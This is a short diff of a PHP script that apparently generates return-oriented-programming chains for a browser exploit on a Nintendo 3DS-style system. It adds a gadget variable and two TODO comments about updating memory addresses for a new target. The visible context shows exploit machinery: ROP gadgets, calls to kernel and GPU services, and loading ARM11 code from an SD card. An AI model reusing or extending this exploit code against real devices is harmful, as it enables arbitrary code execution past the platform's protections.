@@ -921,7 +921,7 @@ function ropgen_write_procid_cmdbuf($indexword)//This writes the current process
 
 function ropgen_writeregdata($addr, $data, $pos)
 {
-	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0IPPC, $ROP_STMR0_R0PC, $browserver;
+	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0IPPC, $ROP_STMR0_R0PC, $ROP_POP_R0R8PC, $browserver;
 
 	if($browserver<0x80)
 	{
@@ -1434,7 +1434,7 @@ function generateropchain_type2()
 {
 	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd;
 
-	$LINEAR_TMPBUF = 0x18B40000;
+	$LINEAR_TMPBUF = 0x18B40000;//TODO: update these for SKATER
 	$LINEAR_CODETMPBUF = $LINEAR_TMPBUF + 0x1000;
 	$OSSCRO_PHYSADDR = ($OSSCRO_HEAPADR - 0x08000000) + $APPHEAP_PHYSADDR;
 	$LINEARADR_OSSCRO = ($OSSCRO_PHYSADDR - 0x20000000) + 0x14000000;
@@ -1589,7 +1589,7 @@ function generateropchain_type3()
 	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $READ_EXEFSFILE, $OPENFILEDIRECTLY_WRAP, $FSFILEIPC_CLOSE, $FSFILEIPC_GETSIZE, $FSFILEIPC_READ, $GSP_WRITEHWREGS;
 
 	$IFile_ctx = $ROPHEAP+0x80;
-	$FILEBUF = 0x18B40000 - 0x00200000-8;
+	$FILEBUF = 0x18B40000 - 0x00200000-8;//TODO: update this for SKATER
 
 	ropgen_writeu32($ROPHEAP, 0x010000FF, 0, 1);
 	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that red is displayed.
